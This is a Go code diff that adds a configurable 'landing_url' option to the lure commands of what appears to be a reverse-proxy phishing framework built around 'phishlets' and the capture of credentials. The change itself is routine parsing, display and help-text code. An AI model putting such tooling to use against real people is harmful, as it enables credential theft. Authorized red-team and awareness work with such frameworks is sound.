@@ -2577,6 +2577,21 @@ func (t *Terminal) handleLures(args []string) error {
 					}
 					do_update = true
 					log.Info("redirect_url = '%s'", l.RedirectUrl)
+				case "landing_url":
+					if val != "" {
+						u, err := url.Parse(val)
+						if err != nil {
+							return fmt.Errorf("edit: %v", err)
+						}
+						if u.Path == "" && u.Host == "" {
+							return fmt.Errorf("edit: landing url must be an absolute url or a path")
+						}
+						l.LandingUrl = val
+					} else {
+						l.LandingUrl = ""
+					}
+					do_update = true
+					log.Info("landing_url = '%s'", l.LandingUrl)
 				case "phishlet":
 					_, err := t.cfg.GetPhishlet(val)
 					if err != nil {
@@ -2885,12 +2900,12 @@ func (t *Terminal) handleLures(args []string) error {
 
 			var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))
 
-			keys := []string{"phishlet", "hostname", "path", "redirector", "post_redirector", "ua_filter", "redirect_url", "paused", "info", "og_title", "og_desc", "og_image", "og_url", "proxy_pool"}
+			keys := []string{"phishlet", "hostname", "path", "redirector", "post_redirector", "ua_filter", "redirect_url", "landing_url", "paused", "info", "og_title", "og_desc", "og_image", "og_url", "proxy_pool"}
 			proxyCount := "none"
 			if len(l.ProxyPool) > 0 {
 				proxyCount = fmt.Sprintf("%d proxy(s)", len(l.ProxyPool))
 			}
-			vals := []string{hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), white.Sprint(l.PostRedirector), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), s_paused, l.Info, dgray.Sprint(l.OgTitle), dgray.Sprint(l.OgDescription), dgray.Sprint(l.OgImageUrl), dgray.Sprint(l.OgUrl), cyan.Sprint(proxyCount)}
+			vals := []string{hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), white.Sprint(l.PostRedirector), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), yellow.Sprint(l.LandingUrl), s_paused, l.Info, dgray.Sprint(l.OgTitle), dgray.Sprint(l.OgDescription), dgray.Sprint(l.OgImageUrl), dgray.Sprint(l.OgUrl), cyan.Sprint(proxyCount)}
 			log.Printf("\n%s\n", AsRows(keys, vals))
 
 			if len(l.ProxyPool) > 0 {
@@ -3558,6 +3573,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("lures", []string{"edit", "post_redirector"}, "edit <id> post_redirector <path>", "sets an html redirector directory <path> served after credentials are captured (before final redirect), for a lure with a given <id>")
 	h.AddSubCommand("lures", []string{"edit", "ua_filter"}, "edit <id> ua_filter <regexp>", "sets a regular expression user-agent whitelist filter <regexp> for a lure with a given <id>")
 	h.AddSubCommand("lures", []string{"edit", "redirect_url"}, "edit <id> redirect_url <redirect_url>", "sets redirect url that user will be navigated to on successful authorization, for a lure with a given <id>")
+	h.AddSubCommand("lures", []string{"edit", "landing_url"}, "edit <id> landing_url <landing_url>", "sets custom landing url or path that user will be redirected to after clicking the lure, for a lure with a given <id>")
 	h.AddSubCommand("lures", []string{"edit", "phishlet"}, "edit <id> phishlet <phishlet>", "change the phishlet, the lure with a given <id> applies to")
 	h.AddSubCommand("lures", []string{"edit", "info"}, "edit <id> info <info>", "set personal information to describe a lure with a given <id> (display only)")
 	h.AddSubCommand("lures", []string{"edit", "og_title"}, "edit <id> og_title <title>", "sets opengraph title that will be shown in link preview, for a lure with a given <id>")
@@ -3936,7 +3952,7 @@ func (t *Terminal) sprintLures() string {
 	hcyan := color.New(color.FgHiCyan)
 	white := color.New(color.FgHiWhite)
 	//n := 0
-	cols := []string{"id", "phishlet", "hostname", "path", "redirector", "post_redirector", "redirect_url", "paused", "og", "proxies"}
+	cols := []string{"id", "phishlet", "hostname", "path", "redirector", "post_redirector", "redirect_url", "landing_url", "paused", "og", "proxies"}
 	var rows [][]string
 	for n, l := range t.cfg.lures {
 		var og string
@@ -3964,7 +3980,7 @@ func (t *Terminal) sprintLures() string {
 		var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))
 
 		proxyCount := strconv.Itoa(len(l.ProxyPool))
-		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), white.Sprint(l.PostRedirector), yellow.Sprint(l.RedirectUrl), s_paused, og, proxyCount})
+		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), white.Sprint(l.PostRedirector), yellow.Sprint(l.RedirectUrl), yellow.Sprint(l.LandingUrl), s_paused, og, proxyCount})
 	}
 	return AsTable(cols, rows)
 }
